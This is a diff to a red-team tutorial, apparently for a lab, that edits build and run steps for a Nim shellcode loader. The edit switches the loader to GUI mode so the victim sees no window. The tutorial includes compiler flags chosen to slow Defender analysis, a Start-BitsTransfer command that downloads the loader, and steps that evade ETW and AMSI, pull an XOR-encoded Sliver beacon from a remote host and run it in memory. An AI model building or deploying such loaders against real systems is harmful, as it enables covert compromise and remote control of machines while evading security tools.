@@ -609,7 +609,7 @@ nim c \
   -d:mingw \
   -d:release \
   --opt:size \
-  --app:console \
+  --app:gui \
   --passL:-s \
   --cpu:amd64 \
   -o:/tmp/loader.exe \
@@ -623,7 +623,7 @@ What each flag does:
 | `-d:mingw` | Cross-compile for Windows. You are compiling on Kali (Linux) but producing a Windows executable. The MinGW toolchain handles the conversion. |
 | `-d:release` | Build in release mode. Removes debug output and enables code optimisations. |
 | `--opt:size` | Optimise the output for the smallest possible file size. A smaller binary takes less time to scan and contains less data for Defender to analyse. |
-| `--app:console` | Produce a console application rather than a GUI application. |
+| `--app:gui` | Produce a GUI application with no console window. This is critical for two reasons. First, when the victim double-clicks the file, no black command prompt window flashes on screen. Second, when run from a CMD prompt, the process detaches immediately — CMD does not block waiting for it to exit. A console binary compiled with `--app:console` will freeze the terminal because `EnumSystemLocalesA` blocks until the shellcode returns, which never happens while the beacon is alive. |
 | `--passL:-s` | Pass the `-s` flag to the linker. This removes all debug symbols and function name information from the binary. Defender cannot match function names it cannot read. |
 | `--cpu:amd64` | Produce a 64-bit binary. The victim machine runs 64-bit Windows. |
 | `-o:/tmp/loader.exe` | Set the output file name and path. |
@@ -681,14 +681,18 @@ Start-BitsTransfer -Source 'http://192.168.10.10:8888/loader.exe' -Destination '
 C:\Windows\Temp\loader.exe
 ```
 
-The process starts. It looks like it does nothing (no output, just a blinking cursor). That is correct. It is:
-1. Installing hardware breakpoints on ETW and AMSI silently — no memory patching
-2. Connecting to `192.168.10.10:8888` and fetching `beacon_encoded.bin`
-3. XOR-decoding the full Sliver beacon shellcode in memory
-4. Allocating RW memory, writing the decoded shellcode, flipping to RX
-5. Executing the shellcode via callback — the beacon starts running
+The CMD prompt returns immediately. No window appears, no output, no blinking cursor. That is correct and expected. The loader is compiled as a GUI application (`--app:gui`), so Windows launches it as a background process and does not wait for it to finish.
 
-The beacon shellcode contains the complete Sliver implant. It immediately starts making HTTPS check-ins to `192.168.10.10:443`. No secondary download step. No port 8080. One connection, one payload, done.
+In the background it is:
+1. Installing hardware breakpoints on ETW and AMSI — no memory patching
+2. Connecting to `192.168.10.10:8888` and fetching `beacon_encoded.bin`
+3. XOR-decoding the Sliver beacon shellcode in memory
+4. Allocating RW memory, writing the decoded shellcode, flipping to RX
+5. Executing the shellcode via `EnumSystemLocalesA` callback — the beacon starts running
+
+If you used `--app:console` instead, the CMD window would freeze and sit there doing nothing for as long as the beacon is alive. That is a red flag for any user who launched it. `--app:gui` avoids this entirely.
+
+The beacon shellcode contains the complete Sliver implant. It immediately starts making HTTPS check-ins to `192.168.10.10:443`.
 
 ### 3.6 Catch the Beacon in Sliver
 
